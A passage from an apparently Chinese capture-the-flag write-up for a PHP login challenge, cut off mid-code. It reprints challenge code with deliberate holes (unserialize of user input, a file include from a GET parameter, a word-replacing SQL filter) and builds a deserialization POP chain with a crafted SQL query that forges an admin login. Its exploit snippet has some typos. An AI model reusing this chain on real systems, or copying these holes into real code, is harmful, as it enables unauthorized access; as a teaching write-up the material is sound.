class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$age</span>,<span class="hljs-variable">$nickname</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;age=<span class="hljs-variable">$age</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;nickname=<span class="hljs-variable">$nickname</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$argument</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;CtrlCase-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$argument</span>[<span class="hljs-number">0</span>]);<br>    &#125;<br>&#125;<br>Class UpdateHelper&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$newinfo</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sql</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$newInfo</span>,<span class="hljs-variable">$sql</span></span>)</span>&#123;<br>        <span class="hljs-variable">$newInfo</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$newInfo</span>);<br>        <span class="hljs-variable">$upDate</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">dbCtrl</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;sql;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dbCtrl</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hostname</span>=<span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dbuser</span>=<span class="hljs-string">&quot;root&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dbpass</span>=<span class="hljs-string">&quot;root&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$database</span>=<span class="hljs-string">&quot;test&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mysqli</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>        <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>        <span class="hljs-variable language_">$this</span>-&gt;token=<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;token&#x27;</span>];<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$sql</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;mysqli=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$this</span>-&gt;hostname, <span class="hljs-variable">$this</span>-&gt;dbuser, <span class="hljs-variable">$this</span>-&gt;dbpass, <span class="hljs-variable">$this</span>-&gt;database);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;mysqli-&gt;connect_error) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;连接失败，错误:&quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;mysqli-&gt;connect_error);<br>        &#125;<br>        <span class="hljs-variable">$result</span>=<span class="hljs-variable language_">$this</span>-&gt;mysqli-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-variable">$sql</span>);<br>        <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">bind_param</span>(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;name);<br>        <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>        <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">bind_result</span>(<span class="hljs-variable">$idResult</span>, <span class="hljs-variable">$passwordResult</span>);<br>        <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br>        <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;token==<span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$idResult</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$idResult</span>) &#123;<br>            <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;用户不存在!&#x27;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;password)!==<span class="hljs-variable">$passwordResult</span>) &#123;<br>            <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;密码错误！&#x27;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;token&#x27;</span>]=<span class="hljs-variable language_">$this</span>-&gt;name;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$idResult</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"><span class="hljs-variable">$sql</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//还没来得及写</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;lib.php&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">require_once</span>(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>].<span class="hljs-string">&quot;.php&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>]==<span class="hljs-number">1</span>)&#123;<br>       <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=update&#x27;&lt;/script&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>       <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=login&#x27;&lt;/script&gt;&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xl">$<span class="hljs-function"><span class="hljs-title">result</span>=$this-&gt;</span><span class="hljs-function"><span class="hljs-title">mysqli</span>-&gt;</span>prepare($sql);<br>$<span class="hljs-function"><span class="hljs-title">result</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">bind_param</span>(&#x27;s&#x27;, $this-&gt;</span><span class="hljs-keyword">name</span>);<br>$<span class="hljs-function"><span class="hljs-title">result</span>-&gt;</span>execute();<br>$<span class="hljs-function"><span class="hljs-title">result</span>-&gt;</span>bind_result($idResult, $passwordResult);<br>$<span class="hljs-function"><span class="hljs-title">result</span>-&gt;</span>fetch();<br>$<span class="hljs-function"><span class="hljs-title">result</span>-&gt;</span>close();<br></code></pre></td></tr></table></figure><p><strong>1、SQL查询准备</strong></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">$sql = &#x27;<span class="hljs-keyword">select</span> id,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username=?<span class="hljs-string">&#x27;;</span><br></code></pre></td></tr></table></figure><ul><li>这行代码定义了一个 SQL 查询，用于从数据库中选择用户的 <code>id</code> 和 <code>password</code>，条件是 <code>username</code> 等于某个值。</li><li><code>?</code> 是一个占位符，用于在后续步骤中安全地插入用户输入，防止 SQL 注入攻击。</li></ul><p><strong>2、预编译SQL查询</strong></p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">$<span class="hljs-function"><span class="hljs-title">result</span> = $this-&gt;</span><span class="hljs-function"><span class="hljs-title">mysqli</span>-&gt;</span>prepare($sql);<br></code></pre></td></tr></table></figure><ul><li>使用 <code>$this-&gt;mysqli-&gt;prepare($sql)</code> 方法预编译 SQL 查询，这是一种防止 SQL 注入的安全机制。这里假设 <code>$this-&gt;mysqli</code> 是当前类中的一个已初始化的 MySQLi 数据库连接实例。</li><li>预编译查询会为之后的参数绑定做准备。</li></ul><p><strong>3、绑定参数</strong></p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">$<span class="hljs-function"><span class="hljs-title">result</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">bind_param</span>(&#x27;s&#x27;, $this-&gt;</span><span class="hljs-keyword">name</span>);<br></code></pre></td></tr></table></figure><ul><li>通过 <code>bind_param(&#39;s&#39;, $this-&gt;name)</code> 方法，将用户名绑定到 SQL 查询中的占位符 <code>?</code>。</li><li><code>&#39;s&#39;</code> 表示绑定的参数是一个字符串类型。</li><li><code>$this-&gt;name</code> 是当前对象的属性，假设是用户输入的用户名。</li></ul><p><strong>4、执行查询</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$result-&gt;<span class="hljs-built_in">execute</span>()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><ul><li>调用 <code>execute()</code> 方法来执行预编译的查询。</li></ul><p><strong>5、绑定查询结果</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$result-&gt;bind_result($idResult, $passwordResult)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><strong>6、获取查询结果</strong></p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$result</span>-&gt;fetch();</span><br></code></pre></td></tr></table></figure><ul><li>调用 <code>fetch()</code> 方法，执行查询并将结果赋值到前面绑定的变量中 <code>$idResult</code> 和 <code>$passwordResult</code>。</li><li>这一步从数据库中提取一行数据。</li></ul><hr><p>寻找pop链，一共两个__destruct()入口函数，其中UpdateHepler类的__destruct()函数刚好可以触发User类的__toString函数，进而出发Info类的__Call()，再出发dbCtrl类login()函数，并且可以构造自己的sql语句传入。login()函数里进行了两次校验分别为session中用户名是否为admin以及登录用户名和密码是否正确，通过任一个校验都能实现登录。我们可以通过伪造sql语句将admin写入session用户名，再进行登录即可通过第一次校验。</p><p>pop链：<code>UpdateHepler::__destruct()-&gt;User::__toString-&gt;Info::__Call()-&gt;dbCtrl::login()</code></p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xl">$a = new UpdateHelper();<br>$<span class="hljs-function"><span class="hljs-title">a</span>-&gt;</span>sql = new User();<br>$<span class="hljs-function"><span class="hljs-title">a</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">sql</span>-&gt;</span>nickname = new Info();<br>$<span class="hljs-function"><span class="hljs-title">a</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">sql</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">nickname</span>-&gt;</span>CtrlCase = new daCtrl();<br>echo serialize();<br></code></pre></td></tr></table></figure><p>然后我们需要绕过这些if判断</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$this</span>-&gt;token==<span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br><span class="hljs-built_in">return</span> <span class="hljs-variable">$idResult</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$idResult</span>) &#123;<br><span class="hljs-built_in">echo</span>(<span class="hljs-string">&#x27;用户不存在!&#x27;</span>);<br><span class="hljs-built_in">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (md5(<span class="hljs-variable">$this</span>-&gt;password)!==<span class="hljs-variable">$passwordResult</span>) &#123;<br><span class="hljs-built_in">echo</span>(<span class="hljs-string">&#x27;密码错误！&#x27;</span>);<br><span class="hljs-built_in">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;token&#x27;</span>]=<span class="hljs-variable">$this</span>-&gt;name;<br><span class="hljs-built_in">return</span> <span class="hljs-variable">$idResult</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们的目的就是这里的$_SESSION[‘token’]&#x3D;$this-&gt;name，</p><p>这里第二次校验将用户输入的password进行一次md5混淆后与查询到的password进行对比。我们可以构造sql语句<code>&#39;select id,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&#39;</code>。这里&#96;”c4ca4238a0b923820dcc509a6f75849b”是字符’1’的md5值</p><p>然后就能绕过第二次验证，然后只要username&#x3D;admin，就能绕过if (!$idResult)。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe</span>(<span class="hljs-params"><span class="hljs-variable">$parm</span></span>)</span>&#123;<br>    <span class="hljs-variable">$array</span>= <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;union&#x27;</span>,<span class="hljs-string">&#x27;regexp&#x27;</span>,<span class="hljs-string">&#x27;load&#x27;</span>,<span class="hljs-string">&#x27;into&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;file&#x27;</span>,<span class="hljs-string">&#x27;insert&#x27;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;alter&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$array</span>,<span class="hljs-string">&#x27;hacker&#x27;</span>,<span class="hljs-variable">$parm</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span>=<span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nickname</span>=<span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$mysqli</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">dbCtrl</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;id=<span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-string">&#x27;select id,password from user where username=?&#x27;</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;id)&#123;<br>                <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>]=<span class="hljs-variable language_">$this</span>-&gt;id;<br>                <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>]=<span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你的ID是&quot;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你好！&quot;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;token&#x27;</span>];<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;id;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$Info</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">getNewinfo</span>());<br>        <span class="hljs-variable">$age</span>=<span class="hljs-variable">$Info</span>-&gt;age;<br>        <span class="hljs-variable">$nickname</span>=<span class="hljs-variable">$Info</span>-&gt;nickname;<br>        <span class="hljs-variable">$updateAction</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">UpdateHelper</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>],<span class="hljs-variable">$Info</span>,<span class="hljs-string">&quot;update user SET age=<span class="hljs-subst">$age</span>,nickname=<span class="hljs-subst">$nickname</span> where id=&quot;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br>        <span class="hljs-comment">//这个功能还没有写完 先占坑</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getNewInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$age</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;age&#x27;</span>];<br>        <span class="hljs-variable">$nickname</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>];<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">safe</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Info</span>(<span class="hljs-variable">$age</span>,<span class="hljs-variable">$nickname</span>)));<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;nickname);<span class="hljs-comment">//危</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;nickname-&gt;<span class="hljs-title function_ invoke__">update</span>(<span class="hljs-variable">$this</span>-&gt;age);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;0-0&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nickname</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$CtrlCase</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$argument</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;CtrlCase-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$argument</span>[<span class="hljs-number">0</span>]);<br>    &#125;<br>&#125;<br>Class UpdateHelper&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$newinfo</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sql</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;sql;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dbCtrl</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hostname</span>=<span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dbuser</span>=<span class="hljs-string">&quot;root&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dbpass</span>=<span class="hljs-string">&quot;root&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$database</span>=<span class="hljs-string">&quot;test&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mysqli</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>        <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>        <span class="hljs-variable language_">$this</span>-&gt;token=<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;token&#x27;</span>];<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$sql</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;mysqli=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$this</span>-&gt;hostname, <span class="hljs-variable">$this</span>-&gt;dbuser, <span class="hljs-variable">$this</span>-&gt;dbpass, <span class="hljs-variable">$this</span>-&gt;database);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;mysqli-&gt;connect_error) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;连接失败，错误:&quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;mysqli-&gt;connect_error);<br>        &#125;<br>        <span class="hljs-variable">$result</span>=<span class="hljs-variable language_">$this</span>-&gt;mysqli-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-variable">$sql</span>);<br>        <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">bind_param</span>(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;name);<br>        <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>        <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">bind_result</span>(<span class="hljs-variable">$idResult</span>, <span class="hljs-variable">$passwordResult</span>);<br>        <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br>        <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;token==<span 